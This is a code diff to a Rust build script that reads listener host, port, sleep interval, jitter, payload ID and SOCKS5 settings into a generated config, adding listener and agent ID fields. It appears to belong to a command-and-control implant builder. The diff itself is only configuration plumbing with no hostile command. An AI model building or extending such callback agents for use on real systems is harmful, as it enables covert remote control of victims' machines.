@@ -12,6 +12,7 @@ fn main() {
     println!("cargo:rerun-if-changed=config.json");
     println!("cargo:rerun-if-env-changed=LISTENER_HOST");
     println!("cargo:rerun-if-env-changed=LISTENER_PORT");
+    println!("cargo:rerun-if-env-changed=LISTENER_ID");
     println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
     println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
     println!("cargo:rerun-if-env-changed=PROTOCOL");
@@ -32,6 +33,7 @@ fn main() {
     // Get configuration from environment variables
     let server_host = env::var("LISTENER_HOST").unwrap_or_default();
     let server_port = env::var("LISTENER_PORT").unwrap_or_default();
+    let listener_id = env::var("LISTENER_ID").unwrap_or_default();
     let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
     let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
     let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
@@ -54,6 +56,7 @@ fn main() {
 
     log_build(&format!("LISTENER_HOST: {}", server_host));
     log_build(&format!("LISTENER_PORT: {}", server_port));
+    log_build(&format!("LISTENER_ID: {}", listener_id));
     log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
     log_build(&format!("PAYLOAD_ID: {}", payload_id));
     log_build(&format!("PROTOCOL: {}", protocol));
@@ -93,6 +96,8 @@ fn main() {
                 "sleep_interval": {},
                 "jitter": 2,
                 "payload_id": "{}",
+                "agent_id": "",
+                "listener_id": "{}",
                 "protocol": "{}",
                 "socks5_enabled": {},
                 "socks5_host": "{}",
@@ -115,6 +120,7 @@ fn main() {
             server_port,
             sleep_interval,
             payload_id,
+            listener_id,
             protocol,
             socks5_enabled,
             socks5_host,
@@ -146,6 +152,8 @@ fn main() {
             "sleep_interval": 5,
             "jitter": 2,
             "payload_id": "",
+            "agent_id": "",
+            "listener_id": "",
             "protocol": "http",
             "socks5_enabled": false,
             "socks5_host": "127.0.0.1",
